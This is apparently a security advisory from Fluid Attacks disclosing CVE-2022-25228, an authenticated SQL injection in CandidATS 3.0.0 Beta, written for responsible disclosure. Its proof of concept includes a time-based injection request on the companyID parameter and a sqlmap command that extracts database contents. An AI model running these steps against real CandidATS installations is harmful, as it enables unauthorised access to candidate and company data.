---
slug: advisories/jackson/
title: CandidATS 3.0.0 - Authenticated SQL Injection
authors: Oscar Uribe
writer: ouribe
codename: jackson
product: CandidATS Version 3.0.0 Beta (Pilava Beta)
date: 2022-04-20 10:00 COT
cveid: CVE-2022-25228
severity: 6.3
description: CandidATS Version 3.0.0 - Authenticated SQL Injection
keywords: Fluid Attacks, Security, Vulnerabilities, Candidats, SQLi
banner: advisories-bg
advise: yes
template: advisory
---

## Summary

|                       |                                                          |
| --------------------- | -------------------------------------------------------- |
| **Name**              | CandidATS 3.0.0 - Authenticated SQL Injection            |
| **Code name**         | [Jackson](https://en.wikipedia.org/wiki/Michael_Jackson) |
| **Product**           | CandidATS                                                |
| **Affected versions** | Version 3.0.0 Beta (Pilava Beta)                         |
| **State**             | Public                                                   |
| **Release date**      | 2022-07-19                                               |

## Vulnerability

|                       |                                                                                  |
| --------------------- | -------------------------------------------------------------------------------- |
| **Kind**              | SQL injection                                                                    |
| **Rule**              | [146. SQL injection](https://docs.fluidattacks.com/criteria/vulnerabilities/146) |
| **Remote**            | Yes                                                                              |
| **CVSSv3 Vector**     | CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L                                     |
| **CVSSv3 Base Score** | 6.3                                                                              |
| **Exploit available** | No                                                                               |
| **CVE ID(s)**         | [CVE-2022-25228](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-25228)  |

## Description

CandidATS Version 3.0.0 Beta allows an authenticated user to inject SQL
queries in `/index.php?m=settings&a=show` via the `userID` parameter,
in `/index.php?m=candidates&a=show` via the `candidateID`,
in `/index.php?m=joborders&a=show` via the `jobOrderID`
and `/index.php?m=companies&a=show` via the `companyID` parameter

## Proof of Concept

1. Log in to CandidATS with a user who has permissions
   to read job orders, candidates or companies.

2. Go to `index.php?m=joborders` (or any of the option above).

3. Uncheck the `Only My Companies` option.

4. Select any of the items listed and
   intercept the request with BurpSuite.

5. It is possible to inject sql sentences inside
   the companyID parameter, for example, the following
   request will make the database sleep for 5 seconds.

  ```http
  GET /candidATS/index.php?m=companies&a=show&companyID=2+or+sleep(5) HTTP/1.1
  ```

6. Save the intercepted request into a file.

  ```http
  GET /candidATS/index.php?m=companies&a=show&companyID=2 HTTP/1.1
  Host: 172.16.28.136
  User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:98.0) Gecko/20100101 Firefox/98.0
  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
  Accept-Language: en-US,en;q=0.5
  Accept-Encoding: gzip, deflate
  Connection: close
  Cookie: CATS=dji5p76l4ajdpubegkt552ma9n
  Upgrade-Insecure-Requests: 1
  ```

7. Run the following command from sqlmap in order
   to extract information from the database.

  ```bash
  $ sqlmap -r companyId.req -p companyID --dbs --batch
  ```

## Exploit

It is possible to use sqlmap in order to
extract information from the database

## Mitigation

This information will be released later according to our
[Responsible Disclosure Policy](../policy/).

## Credits

The vulnerability was discovered by [Oscar
Uribe](https://co.linkedin.com/in/oscar-uribe-londo%C3%B1o-0b6534155) from the Offensive
Team of  `Fluid Attacks`.

## References

**Vendor page** <https://candidats.net/forums/>

## Timeline

<time-lapse
  discovered="2022-04-19"
  contacted="2022-04-19"
  replied="2022-04-20"
  confirmed="2022-04-20"
  patched=""
  disclosure="2022-07-19">
</time-lapse>
